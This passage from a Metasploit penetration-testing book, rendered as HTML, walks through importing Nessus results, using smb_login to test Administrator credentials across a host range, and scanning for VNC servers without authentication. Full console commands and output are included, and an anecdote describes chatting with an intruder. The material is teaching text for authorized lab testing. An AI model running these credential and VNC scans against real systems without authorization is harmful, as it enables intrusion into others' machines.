style="height:11pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">-2</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Prepare for PCI DSS audits</p></td><td style="width:177pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:15pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">-1</p></td><td style="width:123pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">External Network Scan</p></td><td style="width:177pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:15pt"><td style="width:15pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">2</p></td><td style="width:123pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The_Works</p></td><td style="width:177pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table></li><li><p style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Take note of the policy ID you want to use for your scan, and then launch a new scan with <span class="s24">nessus_scan_new </span>followed by the policy number, a name for your scan, and your target IP address as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_148.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nessus_scan_new</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Usage:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] nessus_scan_new &lt;policy id&gt; &lt;scan name&gt; &lt;targets&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] use nessus_policy_list to list all available policies msf &gt; <span class="s24">nessus_scan_new 2 bridge_scan 192.168.1.195</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Creating scan from policy number 2, called &quot;bridge_scan&quot; and scanning 192.168.1.195 [*] Scan started. uid is d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_149.png"/></span></p></li><li><p style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">While your scan is in progress, you can see its status by running the <span class="s24">nessus_scan_status </span>command. When this command’s output responds with “No Scans Running,” as shown next, you will know that your scan has completed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_150.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nessus_scan_status</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] No Scans Running.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_151.png"/></span></p></li><li><p style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">After the scan has completed, you can list the available scan reports with the <span class="s25">nessus_report_list </span>command. Identify the ID of the report you want to import and enter <span class="s24">nessus_report_get </span>to download the report and import it into the Metasploit database automatically.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_152.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nessus_report_list</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] Nessus Report List</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ID Name Status Date</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-- ---- ------ ----</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">074dc984-05f1-57b1-f0c9-2bb80ada82fd3758887a05631c1d Host_195 completed 19:43 Mar 08 2011</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e bridge_scan completed 09:37 Mar 09 2011</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] You can:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Get a list of hosts from the report: nessus_report_hosts &lt;report id&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nessus_report_get d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] importing d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e [*] 192.168.1.195 Microsoft Windows XP Professional (English) Done! [+] Done</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_153.png"/></span></p></li><li><p style="padding-top: 6pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Finally, as with the other import functions demonstrated in this chapter, you can use <span class="s25">db_hosts </span>to verify that the scan data was imported successfully:</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="421" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_154.png"/></span></p><p class="s25" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_hosts -c address,svcs,vulns</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:108.26pt" cellspacing="0"><tr style="height:25pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">Hosts</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">=====</p></td><td style="width:255pt" colspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:15pt"><td style="width:60pt"><p class="s28" style="padding-top: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">address</p></td><td style="width:25pt"><p class="s28" style="padding-top: 4pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">svcs</p></td><td style="width:230pt"><p class="s28" style="padding-top: 4pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">vulns</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">-------</p></td><td style="width:25pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:230pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-----</p></td></tr><tr style="height:15pt"><td style="width:60pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.195</p></td><td style="width:25pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">18</p></td><td style="width:230pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">345</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you’ve seen the variation in scan results from two different products, you should have a better sense of the merit in using more than one tool for your scanning needs. It is still up to the penetration tester to interpret the results from these automated tools and turn them into actionable data.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark136">Specialty Vulnerability Scanners</a><a name="bookmark155">&zwnj;</a></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Although many commercial vulnerability scanners are available on the market, you are not limited to them. When you want to run a scan for a specific vul- nerability across a network, Metasploit’s many auxiliary modules can help you accomplish such tasks.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">The following Metasploit modules are just a few examples of the many useful auxiliary scanning modules included in the Framework. Take advan- tage of your lab to probe and explore as many of them as you can.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark137">Validating SMB Logins</a><a name="bookmark156">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To check the validity of a username and password combination, use the SMB Login Check Scanner to connect to a range of hosts. As you might expect, this scan is loud and noticeable, and each login attempt will show up in the event logs of <span class="s19">every </span>Windows box it encounters.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After selecting the <span class="s19">smb_login </span>module with <span class="s25">use</span>, you can run <span class="s25">show_options </span>to see the settings listed under the Required column. Metasploit allows you to specify a username and password combination, a username and password list, or a combination of either. In the next example, <span class="s25">RHOSTS </span>is set to a small range of IP addresses and a username and password are configured for Metasploit to try against all addresses.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_155.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/smb/smb_login</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_login) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASS_FILE</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">File containing passwords, one per line</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBDomain</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">WORKGROUP</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMB Domain</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBPass</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">password</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMB Password</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBUser</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Administrator</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMB Username</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">50</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:10pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">USERPASS_FILE</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">File containing users and passwords separated</p></td></tr></table><p class="s25" style="padding-left: 236pt;text-indent: 0pt;line-height: 11pt;text-align: left;">by space, one pair per line</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">USER_FILE no File containing usernames, one per line</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_login) &gt; <span class="s24">set RHOSTS 192.168.1.150-155</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.170-192.168.1.175</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_login) &gt; <span class="s24">set SMBUser Administrator</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SMBUser =&gt; Administrator</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(smb_login) &gt; <span class="s24">set SMBPass s3cr3t</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SMBPass =&gt; s3cr3t</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf auxiliary(smb_login) &gt; <span class="s24">run </span>[*] Starting host 192.168.1.154 [*] Starting host 192.168.1.150 [*] Starting host 192.168.1.152 [*] Starting host 192.168.1.151 [*] Starting host 192.168.1.153 [*] Starting host 192.168.1.155</p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[+] 192.168.1.155 - SUCCESSFUL LOGIN (Windows 5.1) &#39;Administrator&#39; : &#39;s3cr3t&#39; [*] Scanned 4 of 6 hosts (066% complete)</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] Scanned 5 of 6 hosts (083% complete)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: justify;">[*] Scanned 6 of 6 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(smb_login) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_156.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">You can see a successful login with user <span class="s19">Administrator </span>and a password of <span class="s19">s3cr3t </span>at <span class="s32">O</span>. Because workstations are all cloned from one image and deployed through the enterprise in many corporate environments, the administrator</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">password may well be the same on all of them, granting you access to every workstation on the network.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark138">Scanning for Open VNC Authentication</a><a name="bookmark157">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Virtual network computing (VNC) provides graphical access to remote sys- tems in a way that’s similar to Microsoft’s Remote Desktop. VNC installations are common throughout corporations, because they provide a GUI-based view of server and workstation desktops. VNC is frequently installed to meet a temporary need and then completely forgotten and left unpatched, creating</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">a major potential vulnerability. Metasploit’s built-in VNC Authentication None scanner searches a range of IP addresses for VNC servers that do not have a password configured (that support “None” authentication, meaning a blank password). Usually, this scan will turn up nothing of value, but a good penetration tester leaves no stone unturned when looking for ways access a target system.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">Recent VNC servers do not allow blank passwords. To set one up in your lab for testing, use older VNC servers such as RealVNC 4.1.1.</span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The VNC scanner, like most Metasploit auxiliary modules, is easy to con- figure and run. The only required configuration for <span class="s25">vnc_none_auth </span>is to supply it with an IP or a range of IPs to scan. Simply select the module, define your <span class="s25">RHOSTS </span>and <span class="s25">THREADS</span>, if desired, and run it, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_157.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/vnc/vnc_none_auth</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(vnc_none_auth) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">5900</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:10pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">THREADS</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The number of concurrent threads</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(vnc_none_auth) &gt; <span class="s24">set RHOSTS 192.168.1.155</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(vnc_none_auth) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.155:5900, VNC server protocol version : RFB 003.008 [*] 192.168.1.155:5900, VNC server security types supported : None</p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] 192.168.1.155:5900, VNC server security types includes None, free access! [*] Scanned 1 of 1 hosts (100% complete)</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(vnc_none_auth) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_158.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">If you get lucky and Metasploit finds a VNC server with no authentica- tion <span class="s32">O</span>, you can use Back|Track’s <span class="s19">vncviewer </span>to connect to the target machine without a password, as shown in Figure 4-18.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="440" height="115" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_159.gif"/></span></p><p class="s29" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-18: Connecting to VNC with no authentication using <span class="s30">vncviewer</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">If you think a VNC scan is likely to be a waste of time and that you’ll never find systems with open VNC servers enabled, think again. During a large penetration test, which included thousands of systems, one of the authors noticed that one of those systems had an open VNC server.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">While the author was in the system documenting his finding, he noticed activity on the system. This was overnight on a system that was unlikely to have an authorized user on it. While not always considered a best practice, the author pretended to be another unauthorized intruder and engaged the intruder in conversation via Notepad. The intruder was not very bright and told the author that he was scanning large blocks of systems for open VNC servers. Here is a segment of the conversation:</p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Author: <span class="s42">You in the us? or out of country? I know some people in denmark.</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Attacker: <span class="s42">I’m from Norway actually, hehe, I have relatives in Denmark.</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Author: <span class="s42">You hang in any boards? like I used to like some but they have been going away</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Attacker: <span class="s42">I mostly hang in some programming boards, but not much else. Have you been into hacking for a long time or what? What’s your age btw? I’m 22.</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Author: <span class="s42">I have been on this for like fun for around a year or so. Still in school. 16. Just something to do.</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Attacker: <span class="s42">Haven’t been there. I too mostly do this for fun, just trying to see what I can do, test my skills. I wrote the “VNC finder” myself btw, I have found a lot of servers, but this is the only one where I could actually have some fun</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Author: <span class="s42">Wow. What did you write it in? Can I dl it? Do you have a handle?</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: left;">Attacker: <span class="s42">It’s written in a language called PureBasic, but it’s kinda not ready for release yet, it’s only for my own use. But maybe I can share it anyway, I could upload the code somewhere and let you compile it. That is if you can find some PureBasic compiler on some warez site :P</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: justify;">Author: <span class="s42">Thats cool. you can put it in that pastebin site from irc. That lets you anon post I have not done purebasic before. just python and perl</span></p><p class="s41" style="padding-top: 5pt;padding-left: 126pt;text-indent: 0pt;text-align: justify;">Attacker: <span class="s42">Let me see, I&#39;ll look for that pastebin site and upload it, just give me some minutes, I’ll be around.</span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">The attacker then gave the author a link to a pastebin page with the full source for the custom VNC scanner he was using.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark139">Scanning for Open X11 Servers</a><a name="bookmark158">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Metasploit’s built-in <span class="s19">open_x11 </span>scanner is similar to the <span class="s19">vnc_auth </span>scanner,</p><p style="padding-left: 